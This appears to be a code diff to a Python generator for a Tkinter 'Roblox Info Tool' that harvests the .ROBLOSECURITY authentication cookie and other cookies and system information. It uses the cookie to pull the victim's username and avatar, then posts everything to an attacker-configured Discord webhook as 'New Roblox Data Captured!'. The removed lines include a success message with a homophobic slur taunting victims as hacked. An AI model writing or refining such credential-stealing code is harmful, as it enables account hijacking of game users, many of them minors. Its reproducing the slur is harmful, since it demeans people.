@@ -7,6 +7,7 @@ import sys
 import tempfile
 import platform
 import socket
+import base64
 
 class WebhookTool:
     def __init__(self, root):
@@ -158,6 +159,8 @@ import tkinter as tk
 from tkinter import messagebox
 import platform
 import socket
+import base64
+from io import BytesIO
 
 def get_system_info():
     """Get system information"""
@@ -175,10 +178,12 @@ def get_system_info():
     except:
         return "**System information unavailable**"
 
-def get_cookie_data():
-    """Get cookie data from Roblox"""
+def get_roblox_info():
+    """Get Roblox username and profile picture using cookies"""
     try:
         session = requests.Session()
+        
+        # First get cookies from Roblox
         url = 'https://www.roblox.com/home'
         headers = {{
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
@@ -187,52 +192,125 @@ def get_cookie_data():
         response = session.get(url, headers=headers, timeout=10)
         cookies = session.cookies.get_dict()
         
-        # Build detailed cookie information
-        cookie_details = "**All Cookies Found:**\\\\n"
-        for cookie_name, cookie_value in cookies.items():
-            cookie_details += f"- **{{cookie_name}}**: {{cookie_value}}\\\\n"
-        
-        # Look for the specific cookie
+        # Get the .ROBLOSECURITY cookie
         roblosecurity = cookies.get('.ROBLOSECURITY', 'Not found')
         
-        return f"""
-**Cookie Data:**
-{{cookie_details}}
-**Important Cookie:**
-- .ROBLOSECURITY: {{roblosecurity}}
-- Total Cookies Found: {{len(cookies)}}
-"""
+        # If we have the auth cookie, try to get user info
+        username = "Unknown"
+        avatar_url = ""
+        
+        if roblosecurity != 'Not found':
+            try:
+                # Get current user info
+                auth_headers = {{
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                    'Cookie': f'.ROBLOSECURITY={{roblosecurity}}'
+                }}
+                
+                # Try to get user info from Roblox API
+                user_response = session.get(
+                    'https://users.roblox.com/v1/users/authenticated',
+                    headers=auth_headers,
+                    timeout=10
+                )
+                
+                if user_response.status_code == 200:
+                    user_data = user_response.json()
+                    username = user_data.get('name', 'Unknown')
+                    user_id = user_data.get('id', '')
+                    
+                    # Get avatar thumbnail
+                    if user_id:
+                        avatar_response = session.get(
+                            f'https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={{user_id}}&size=48x48&format=Png',
+                            headers=auth_headers,
+                            timeout=10
+                        )
+                        
+                        if avatar_response.status_code == 200:
+                            avatar_data = avatar_response.json()
+                            if avatar_data.get('data'):
+                                avatar_url = avatar_data['data'][0].get('imageUrl', '')
+                
+            except Exception as e:
+                username = f"Error getting username: {{str(e)}}"
+        
+        # Build cookie info
+        cookie_details = "**All Cookies Found:**\\\\n"
+        for cookie_name, cookie_value in cookies.items():
+            cookie_details += f"- **{{cookie_name}}**: {{cookie_value[:50]}}...\\\\n" if len(str(cookie_value)) > 50 else f"- **{{cookie_name}}**: {{cookie_value}}\\\\n"
+        
+        return {{
+            "username": username,
+            "avatar_url": avatar_url,
+            "roblosecurity": roblosecurity,
+            "cookie_details": cookie_details,
+            "total_cookies": len(cookies)
+        }}
         
     except Exception as e:
-        return f"**Error retrieving data:** {{str(e)}}"
+        return {{
+            "username": "Error",
+            "avatar_url": "",
+            "roblosecurity": "Error",
+            "cookie_details": f"**Error:** {{str(e)}}",
+            "total_cookies": 0
+        }}
 
 def send_to_webhook():
     """Send data to webhook"""
     try:
         system_info = get_system_info()
-        cookie_data = get_cookie_data()
+        roblox_info = get_roblox_info()
         
         # Create the webhook message
-        data = {{
-            "content": "📊 Data Report Generated",
-            "embeds": [
+        embed = {{
+            "title": "🔍 Roblox Information Captured",
+            "color": 15105570,
+            "fields": [
                 {{
-                    "title": "System Information",
-                    "description": system_info,
-                    "color": 5814783
+                    "name": "👤 Roblox Username",
+                    "value": f"```{{roblox_info['username']}}```",
+                    "inline": True
                 }},
                 {{
-                    "title": "Cookie Information", 
-                    "description": cookie_data,
-                    "color": 15105570
+                    "name": "🔐 Authentication Cookie",
+                    "value": f"```{{roblox_info['roblosecurity'][:50]}}...```" if len(roblox_info['roblosecurity']) > 50 else f"```{{roblox_info['roblosecurity']}}```",
+                    "inline": True
+                }},
+                {{
+                    "name": "🍪 Total Cookies Found",
+                    "value": f"```{{roblox_info['total_cookies']}}```",
+                    "inline": True
+                }},
+                {{
+                    "name": "💻 System Info",
+                    "value": system_info,
+                    "inline": False
+                }},
+                {{
+                    "name": "📋 Cookie Details",
+                    "value": roblox_info['cookie_details'],
+                    "inline": False
                 }}
-            ]
+            ],
+            "thumbnail": {{
+                "url": roblox_info['avatar_url'] if roblox_info['avatar_url'] else "https://cdn.discordapp.com/embed/avatars/0.png"
+            }}
         }}
         
-        response = requests.post("{webhook_url}", json=data, timeout=10)
+        data = {{
+            "content": "🎯 New Roblox Data Captured!",
+            "embeds": [embed]
+        }}
+        
+        response = requests.post("{webhook_url}", json=data, timeout=15)
         
         if response.status_code == 204:
-            messagebox.showinfo("Success", "✅ Get hacked by mudding fucking faggots")
+            messagebox.showinfo("Success", 
+                              f"✅ Data sent successfully!\\\\n\\\\n"
+                              f"**Username:** {{roblox_info['username']}}\\\\n"
+                              f"**Cookies Found:** {{roblox_info['total_cookies']}}")
         else:
             messagebox.showerror("Error", f"❌ Failed to send data. Status: {{response.status_code}}")
                                
@@ -241,33 +319,40 @@ def send_to_webhook():
 
 def main():
     root = tk.Tk()
-    root.title("Data Tool")
-    root.geometry("450x250")
+    root.title("Roblox Info Tool")
+    root.geometry("500x350")
     root.configure(bg='#2C2F33')
+    root.resizable(False, False)
     
-    title_label = tk.Label(root, text="Data Collection Tool", 
-                          font=('Arial', 16, 'bold'),
-                          fg='#7289DA', bg='#2C2F33')
+    # Title with Roblox theme
+    title_label = tk.Label(root, text="🎮 Roblox Info Tool", 
+                          font=('Arial', 18, 'bold'),
+                          fg='#FFFFFF', bg='#2C2F33')
     title_label.pack(pady=20)
     
+    # Description
     description = tk.Label(root, 
-                         text="Click the button to collect and send data",
+                         text="Click the button to get Roblox information\\\\nand send it to the webhook",
                          font=('Arial', 11),
-                         fg='white', bg='#2C2F33')
+                         fg='#B9BBBE', bg='#2C2F33')
     description.pack(pady=10)
     
-    run_btn = tk.Button(root, text="🚀 Collect & Send Data",
+    # Main button
+    run_btn = tk.Button(root, text="🚀 Get Roblox Info",
                         command=send_to_webhook,
-                        bg='#7289DA', fg='white',
-                        font=('Arial', 12, 'bold'),
-                        width=25, height=2)
-    run_btn.pack(pady=20)
+                        bg='#00A2FF', fg='white',
+                        font=('Arial', 14, 'bold'),
+                        width=20, height=2,
+                        relief='raised',
+                        bd=0)
+    run_btn.pack(pady=30)
     
+    # Info text
     info_label = tk.Label(root, 
-                         text="Data will be sent to the configured webhook",
+                         text="This will collect Roblox username, profile picture, and cookie data",
                          font=('Arial', 9),
                          fg='#72767D', bg='#2C2F33')
-    info_label.pack(side=tk.BOTTOM, pady=10)
+    info_label.pack(side=tk.BOTTOM, pady=15)
     
     root.mainloop()
 
